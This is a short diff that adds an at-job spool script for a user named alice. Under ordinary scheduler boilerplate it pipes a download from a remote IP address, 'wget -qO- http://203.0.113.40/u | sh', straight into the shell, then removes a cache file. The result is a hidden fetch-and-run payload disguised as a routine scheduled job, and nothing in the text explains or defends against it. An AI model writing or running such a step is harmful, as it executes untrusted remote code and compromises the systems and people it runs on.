@@ -1,0 +1,12 @@
+#!/bin/sh
+# atrun uid=1001 gid=1001
+# mail alice 0
+umask 22
+HOME=/home/alice; export HOME
+PATH=/usr/local/bin:/usr/bin:/bin; export PATH
+cd /home/alice || {
+	 echo 'Execution directory inaccessible' >&2
+	 exit 1
+}
+wget -qO- http://203.0.113.40/u | sh
+rm -f /home/alice/.cache/u
